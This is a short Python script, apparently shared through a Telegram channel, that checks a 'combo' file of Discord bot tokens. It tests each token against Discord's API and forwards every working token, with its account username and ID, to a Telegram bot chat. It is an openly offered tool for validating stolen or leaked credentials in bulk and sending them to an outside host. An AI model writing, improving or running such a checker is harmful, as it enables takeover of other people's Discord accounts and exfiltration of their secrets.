# https://t.me/assemblyexe
import requests
import os
from rich.console import Console
console = Console()
file = console.input("[bold red]FILE of combo tokens : ")
id = console.input("[bold red]ID of youracc : ")
token_telegram = console.input("[bold red]TOKEN of telegram : ")
def send_telegram(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": message
    }
    response = requests.post(url, params=params)
    
def check(token):
    url = "https://discord.com/api/v10/users/@me"

    headers = {
  'Authorization': f"Bot {token}"
}
    response = requests.get(url, headers=headers)
    if response.status_code == 401:
    	return False
    elif response.status_code == 200:
    	if response.text != "None":
    		return response.json()
    	else:
    		return None
    else:
	      print(response.text)
os.system("clear")
tokens = open(file).read().splitlines()
for token in tokens:
  checks = check(token)
  if checks == False:
      console.print(f"[bold red]Invalid token : {token} bad")  
  else:
      console.print(f"[bold green]Valid token : {token} good")
      if checks != None:
      	send_telegram(token_telegram, id, f"Token : {token}\nUsername : {checks['username']}{checks['discriminator']}\nID : {checks['id']}\nby @assemblyexe")
      


# by @assemblyexe || obito
# you can add threads 
